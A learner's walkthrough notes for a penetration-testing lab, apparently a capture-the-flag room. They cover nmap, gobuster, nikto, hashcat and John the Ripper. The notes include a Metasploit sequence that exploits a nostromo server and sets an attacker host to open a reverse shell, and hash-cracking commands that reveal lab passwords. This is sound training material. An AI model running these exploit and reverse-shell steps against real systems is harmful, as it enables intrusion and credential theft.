# CC: Pentesting


## Nmap
- nmap: network mapper
- **All these are on the man page "man nmap"**
- Specify ports to scan with -p
- Do ping scan with -sn
- Do UDP scan -sU
- Run default scripts with -sC
- Enable aggressive mode with -A
- Enable OS detection with -O
- Enable version scanning -sV
- "sudo nmap -sS 10.10.139.90", 1 port open: 80
- "sudo nmap -A 10.10.139.90", Apache2 service running, version 2.4.18
- Should appear in the previous output because -A also uses -sC (default scripts), but to see it more clearly use "sudo nmap --script=http-title 10.10.139.90" to get the output: Apache2 Ubuntu Default Page: It works


## Netcat
- Netcat allows users to connect to specific ports and send and receive data, and is popularly used to gain a reverse shell
- **All of these are on the help page "nc --help"**
- Listen to connections with -l
- Enable verbose mode with -v
- Specify port with -p
- Specify a program to execure after you connect to a host -e
- Connect to udp ports with -u


## Gobuster
- Gobuster finds valid directories from a wordlist of possible directories, great for reconnaissance
- **Use "gobuster --help" and "gobuster [command] --help"**
- Use the "dir" command to specify directory/file brute forcing mode
- Use the "dns" command to use dns bruteforcing mode
- The -x flag sets extensions to be used. Found using "gobuster dir --help"
- -w to specify wordlist
- -U to set username for basic authentication
- -P to set password for basic authentication
- -s to set which status codes will be interpreted as valid
- -k to skip ssl certificate verification
- -a to specify a user agent
- -H to specify a http header
- -u to specify URL
- To find the hidden directory we use the 'common.txt' wordlist from dirb: "gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.159". We find that the hidden directory is '/secret'
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.4.159
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/24 22:52:04 Starting gobuster
>===============================================================
>/.hta (Status: 403)
>/.htaccess (Status: 403)
>/.htpasswd (Status: 403)
>/index.html (Status: 200)
>/secret (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/24 22:52:05 Finished
>===============================================================

- To find the hidden file with the xxa extension we simply add "-x xx" to the last command. The only .xxa file that has a 200 response is password.xxa
>root@ip-10-10-130-53:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.159 -x xxa
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.4.159
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Extensions:     xxa
>[+] Timeout:        10s
>===============================================================
>2021/11/24 22:57:09 Starting gobuster
>===============================================================
>/.htpasswd (Status: 403)
>/.htpasswd.xxa (Status: 403)
>/.htaccess (Status: 403)
>/.htaccess.xxa (Status: 403)
>/.hta (Status: 403)
>/.hta.xxa (Status: 403)
>/index.html (Status: 200)
>/password.xxa (Status: 200)
>/secret (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/24 22:57:10 Finished
>===============================================================


## Nikto
- Nikto scans a web server for known vulnerabilities. Used to check for common CVE's and get general information about the web server
- **Use "man nikto"**
- -h to specify URL or host
- -nossl to disable ssl
- -ssl to force ssl
- -id to specify authentication
- -plugins to select plugins. -list-plugins to list all plugins
- Use "nikto -list-plugins | grep apache" and we find the plugin "apacheusers"
- -update to update plugins and databases
- -list-plugins to list all plugins


## Metasploit
- One of the most popular penetration testing frameworks. Contains a database of almost every major CVE that can be used against a machine
- Use `msfconsole --help` for startup options
### Setting Up
- Enter msfconsole and use `help` to see all commands or `help command` to get help on commands
- `search` to search modules
- `use` to use a module
- `info` to display info about module
- `options` to show options about module
- `advanced` to show advanced options
- `show` to show options about certain category
### Selecting a Module
- Use `search eternalblue` and then `use exploit/windows/smb/ms17_010_eternalblue`
- Use `options` to see options
- rhosts
- rport
- `set`
- `set SMBPass username`
- `set SMBUser password`
- arch
- payload
- exploit
- Use `help exploit` to find the -j option
- sessions
- Use `help sessions` to find -i option
### Meterpreter
- Meterpreter is metasploit's control center where you can interact with the machine
- [Meterpreter commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- Access meterpreter with the `post/multi/manage/shell_to_meterpreter` module
- download
- upload
- ps
- migrate
- ls
- execute
- shell
- search
- cat
- background
### Final Walkthrough
1. `use exploit/multi/http/nostromo_code_exec`
2. `set RHOSTS <victim ip>`
3. `set RPORT <victim port>`
4. `set LHOST <attacker ip>`
5. `background`
6. `use post/multi/manage/shell_to_meterpreter`
7. `set SESSION <nostromo code exec session>`
8. `exploit`
9. If meterpreter doesn't take you directly to the meterpreter console, use `sessions -i <meterpreter session>` to access it
10. Now we have access to the remote pc, and we use `ls /var/nostromo/htdocs` to see that s3cretd1r is the hidden directory
11. Now navigate to s3cretd1r `cd /var/nostromo/htdocs/s3cretd1r` and view the contents of the 'nice' file to get 'Woohoo!'


## Hash Cracking
- When gaining access to a database, look for a users table that may contain usernames and hashed passwords
- It's necessary to crack hashed passwords to gain access to a website or services like ssh
### Salting and Formatting
- Most tools will use the same format, a file with hashes with each hash being separeted by a newline
><hash 1>
>
><hash 2>
>
><hash 3>
- Salts are appented to the has with a colon and the salt
>hash1:salt
>
>hash2:salt
>
>hash3:salt
- Different algorithms treat salts differently
### Hashcat
- One of the most popular hash cracking tools
- Doesn't have auto detection for hashtypes, has [modules](https://hashcat.net/wiki/doku.php?id=example_hashes)
- Use `hashcat --help` and the modules list to answer questions
1. -m sets the mode
2. -a sets attack mode
3. 3 is attack mode number for brute force
4. 17600 is the mode number for SHA3-512
5. Use `hashcat -m 0 -a 3 56ab24c15b72a457069c5ea42fcfc640` to find that the answer is 'happy'
6. The mode number for md4 is 900, so we use `hashcat -m 900 -a 3 4bc9ae2b9236c2ad02d81491dcb51d5f` to try to brute force it, but it takes a long time
7. We can instead use a dictionary attack by downloading the [rockyou wordlist](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjOudylvcP0AhWKgVwKHUZmDBwQFnoECAYQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd) and using `hashcat -m 900 -a 0 4bc9ae2b9236c2ad02d81491dcb51d5f rockyou.txt` to get 'nootnoot'
### John the Ripper
- Easy to use, supports different formats of hashes, and is customizable
- There are various versions of john the ripper, we're using the one preinstalled on kali
- Use `john --help` and `john --list=help` for help. Ex. To get a list of formats that are supported use `john --list=formats`
1. --wordlist to specify wordlist
2. --format to specify format of hash
3. --rules to specify rules
4. Download the rockyou wordlist. Create a file and insert the hash in it `5d41402abc4b2a76b9719d911017c592`. Find which format you want to use with `john --list=formats | grep -i md5`. Then run `john --wordlist=rockyou --format=raw-md5 fileName`, and we get 'hello'
5. Create a file and insert the hash into it `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`. Find which format you want to use with `john --list=formats | grep -i sha1`. Then run `john --wordlist=rockyou --format=raw-sha1 fileName`, and we get 'password'
